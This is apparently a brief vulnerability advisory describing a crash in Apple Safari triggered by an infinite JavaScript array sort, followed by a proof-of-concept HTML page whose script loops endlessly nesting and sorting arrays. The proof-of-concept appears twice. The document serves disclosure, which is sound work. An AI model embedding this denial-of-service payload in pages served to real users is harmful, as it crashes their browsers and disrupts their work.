Apple Safari Web Browser is prone to a vulnerability that may result in a browser crash. This issue is exposed when the browser performs an infinite JavaScript array sort operation. It is conjectured that this will only result in a denial of service and is not further exploitable to execute arbitrary code, though this has not been confirmed.

<HTML>
<SCRIPT> a = new Array(); while (1) { (a = new Array(a)).sort(); } </SCRIPT>
<SCRIPT> a = new Array(); while (1) { (a = new Array(a)).sort(); } </SCRIPT>
